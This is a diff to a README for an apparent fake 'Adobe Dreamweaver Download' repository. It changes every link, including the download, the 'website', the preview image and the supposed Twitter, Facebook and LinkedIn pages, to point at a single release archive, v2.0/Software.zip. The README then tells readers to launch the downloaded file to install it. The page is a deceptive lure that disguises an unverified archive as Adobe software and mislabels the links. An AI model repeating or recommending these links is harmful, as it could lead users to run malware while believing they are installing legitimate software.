@@ -26,7 +26,7 @@ In this repository, you can explore a variety of topics related to Adobe Dreamwe
 - adobe-dreamweaver-website-examples
 
 ### Download Software
-📥 [Download Adobe Dreamweaver Software](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v1.0/Application.zip)
+📥 [Download Adobe Dreamweaver Software](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip)
 
 ### Note
 The software needs to be launched after downloading to begin the installation process.
@@ -38,17 +38,17 @@ To make the most of this repository, follow these steps:
 3. Dive into the world of web design and development with Adobe Dreamweaver!
 
 ## 🌐 Visit Our Website
-Looking for additional resources and updates? Visit our website [here](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v1.0/Application.zip) for more information.
+Looking for additional resources and updates? Visit our website [here](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip) for more information.
 
 ## 📸 Repository Preview
 Take a sneak peek at some of the exciting content available in this repository:
-![Adobe Dreamweaver](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v1.0/Application.zip)
+![Adobe Dreamweaver](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip)
 
 ## 🌈 Connect With Us
 Stay connected with us for the latest updates and community interactions:
-- [Twitter](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v1.0/Application.zip)
-- [Facebook](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v1.0/Application.zip)
-- [LinkedIn](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v1.0/Application.zip)
+- [Twitter](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip)
 
 ## 📝 Contributions
 Contributions to this repository are welcome! Feel free to submit a pull request with any additional resources or information related to Adobe Dreamweaver.
@@ -58,4 +58,4 @@ Thank you for exploring the "Adobe Dreamweaver Download" repository. We hope you
 
 Let's create amazing websites together with Adobe Dreamweaver! 🌟
 
-```Feel free to customize this https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v1.0/Application.zip to fit the specific needs of your repository. Happy coding!```
+```Feel free to customize this https://github.com/laurits606/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip to fit the specific needs of your repository. Happy coding!```
